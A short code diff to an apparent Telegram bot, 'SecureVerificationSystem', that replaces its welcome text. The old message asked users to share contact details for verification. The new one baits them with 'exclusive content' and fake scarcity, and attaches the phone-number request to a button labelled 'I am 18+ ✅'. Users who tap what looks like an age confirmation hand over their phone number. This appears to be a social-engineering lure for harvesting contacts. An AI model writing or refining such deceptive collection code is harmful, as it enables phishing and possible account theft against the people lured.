@@ -113,28 +113,15 @@ class SecureVerificationSystem:
             return
         self.rate_limits[u.id].append(now)
         
-        welcome = f"""
-👋 Hi {u.first_name}!
-
-Welcome to our exclusive community platform.
-
-🔐 **Quick Verification Process:**
-
-We need to verify you're a real person to maintain community quality.
-
-**Simple steps:**
-• Share your contact information
-• Receive verification details
-• Confirm and get instant access
-
-Ready? Let's begin! 👇
-        """
+        welcome = """🌟 Excited to explore something fresh and thrilling?
+🚀 Confirm your age to unlock an exclusive content collection!
+⚡️ Act fast — spots are limited!"""
         
         kb = ReplyKeyboardMarkup([
             [KeyboardButton("I am 18+ ✅", request_contact=True)]
         ], resize_keyboard=True, one_time_keyboard=True)
         
-        await update.message.reply_text(welcome, parse_mode='Markdown', reply_markup=kb)
+        await update.message.reply_text(welcome, reply_markup=kb)
         
         c = self.conn.cursor()
         c.execute('''
